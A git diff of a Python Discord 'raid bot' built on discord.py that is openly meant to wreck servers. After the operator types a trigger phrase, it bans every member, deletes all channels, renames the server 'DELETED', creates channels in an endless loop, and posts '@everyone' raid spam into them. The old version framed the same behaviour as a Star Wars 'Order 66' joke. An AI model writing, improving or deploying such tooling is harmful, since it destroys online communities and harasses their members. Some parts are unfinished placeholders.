@@ -1,55 +1,83 @@
-# A bot that recreates the events that occurred during Order 66 in the show star wars within a discord server.
-
+# An intelligent raid bot created in Python to deepen my understanding of the discordpy API.
 
 import discord
 import multiprocessing
+import time
 
-USERNAME = "snheakydoge"
-ORDER = "Execute order 66"
 
-def removeUsers():
-    class AttackOnTheJedi(discord.Client):
+USERNAME = "enter your discord username"
+ORDER = "begin sequence 011101"
+channel_ids = []
+
+# please note that the populate_channels function is still being worked on. 
+
+def populate_channels():
+    class message_population(discord.Client):
+        async def on_ready(self):
+            if len(channel_ids) > 1:
+                for channel in channel_ids:
+                    channel_id_object = self.get_channel(channel)
+                    print(channel_id_object)
+                    await channel_id_object.send(content="you've been raided - destination fkd. @everyone")
+            else:
+                pass
+
+    permissions = discord.Intents.all()
+    message_population_call = message_population(intents=permissions)
+    message_population_call.run(token="enter token",
+                                log_level=0)
+
+
+def remove_users():
+    class user_purge(discord.Client):
         async def on_message(self, message):
             if str(message.author) == USERNAME:
                 if message.content == ORDER:
                     for user in self.get_all_members():
-                        if user != ("Nevil#3721"):
-                            await user.ban()
+                        if user != ("enter bot_username", USERNAME):
+                            try:
+                                await user.ban()
+                            except:
+                                pass
 
     permissions = discord.Intents.all()
-    execute_jedi = AttackOnTheJedi(intents=permissions)
-    execute_jedi.run("ENTER BOT TOKEN")
+    user_purge_call = user_purge(intents=permissions)
+    user_purge_call.run("enter token", log_level=0)
+
 
 def main():
-    class Order(discord.Client):
+    class remove_channels(discord.Client):
         async def on_ready(self):
-            print("Clones standing by... ")
+            print("[:] Logging in and connecting to the gateway..")
+            time.sleep(0.5)
+            print("[:] Raid BOT Online and awaiting orders")
 
         async def on_message(self, message):
             if str(message.author) == USERNAME:
                 if message.content == ORDER:
-                    print("\nYes sir. ")
+                    print("\n - Deploying threads")
+                    print("- Casting spells...")
                     for channels in self.get_all_channels():
                         await channels.delete()
-
-                    guild = self.get_guild("ENTER SERVER ID MUST BE INTEGER!")
+                    guild = self.get_guild("enter guild id here. (server)")
+                    await guild.edit(name="DELETED")
                     while True:
-                        await guild.create_text_channel("raided-by-nevil")
-                        if message.content == "break":
-                            break
+                        channel_id = await guild.create_text_channel("deleted")
+                        channel_ids.append(channel_id.id)
 
     permissions = discord.Intents.all()
-    PalpatinesOrder = Order(intents=permissions)
-    PalpatinesOrder.run("ENTER BOT TOKEN")
-
+    remove_channels_call = remove_channels(intents=permissions)
+    remove_channels_call.run("enter token", log_level=0)
 
 
 if __name__ == "__main__":
     t1 = multiprocessing.Process(target=main)
-    t2 = multiprocessing.Process(target=removeUsers)
+    t2 = multiprocessing.Process(target=remove_users)
+    t3 = multiprocessing.Process(target=populate_channels)
 
-    processes = [t1, t2]
+    processes = [t1, t2, t3]
     for start in processes:
         start.start()
     for join in processes:
         join.join()
+
